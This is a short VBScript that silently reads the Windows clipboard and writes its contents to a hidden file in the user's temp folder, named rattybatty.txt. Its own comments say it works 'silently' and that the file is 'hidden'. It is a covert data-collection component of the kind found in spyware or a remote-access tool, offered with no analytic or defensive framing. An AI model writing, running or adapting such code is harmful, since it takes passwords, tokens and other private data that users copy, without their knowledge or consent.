' Create a FileSystemObject to write the file silently
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Create an HTMLFile object to access the clipboard
Set objHTML = CreateObject("htmlfile")
clipboardText = objHTML.ParentWindow.ClipboardData.GetData("text")

' Check if clipboardText is empty
If IsNull(clipboardText) Or clipboardText = "" Then
    WScript.Quit ' Exit if clipboard is empty
End If

' Define the file path (hidden in user's temp folder)
strFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\rattybatty.txt")

' Create and write to the file
Set objFile = objFSO.CreateTextFile(strFilePath, True)
objFile.Write clipboardText
objFile.Close

' Release objects
Set objFSO = Nothing
Set objHTML = Nothing
Set objFile = Nothing
